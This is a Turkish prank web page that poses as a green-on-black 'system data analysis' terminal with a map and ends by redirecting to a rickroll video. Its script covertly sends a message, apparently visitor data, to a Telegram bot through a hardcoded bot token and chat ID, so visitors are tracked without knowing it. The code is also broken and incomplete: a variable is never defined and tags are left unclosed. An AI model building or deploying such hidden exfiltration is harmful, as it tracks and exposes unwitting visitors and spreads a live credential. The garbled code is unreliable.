<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Sistem Veri Analizi</title>
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100vh;
      background: black; color: #0f0; font-family: 'Courier New', monospace;
      overflow: hidden; display: flex; justify-content: center; align-items: center;
    }
    #container {
      width: 95vw; max-width: 1200px; height: 95vh;
      background-color: #050505; border: 1px solid #0f0;
      box-shadow: 0 0 20px #003300; display: flex; flex-direction: column;
    }
    #terminal {
      flex: 1; padding: 20px; overflow-y: auto; font-size: 13px; line-height: 1.5;
    }
    #map { height: 300px; border-top: 1px solid #0f0; filter: grayscale(100%) invert(100%) contrast(150%); }
    .scan-line {
      position: absolute; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.1);
      top: 0; animation: scan 3s linear infinite; pointer-events: none;
    }
    @keyframes scan { from { top: 0; } to { top: 100%; } }
    #rickrollButton {
      background: #0f0; color: #000; border: none; padding: 15px;
      font-weight: bold; cursor: pointer; display: none;
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
</head>
<body>
  <div class="scan-line"></div>
  <div id="container">
    <pre id="terminal"></pre>
    <div id="map"></div>
    <button id="rickrollButton">SÄ°STEMÄ° DURDUR VE Ã‡IK</button>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>

  <script>
    const terminal = document.getElementById('terminal');
    const btn = document.getElementById('rickrollButton');
    
    function log(text, delay = 0) {
      return new Promise(res => {
        setTimeout(() => {
          terminal.textContent += `> ${text}\n`;
          terminal.scrollTop = terminal.scrollHeight;
          res();
        }, delay);
      });
    }

        fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage?chat_id=6400737507&text=${encodeURIComponent(msg)}`);

        btn.style.display = 'block';

    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

</body>
</html>
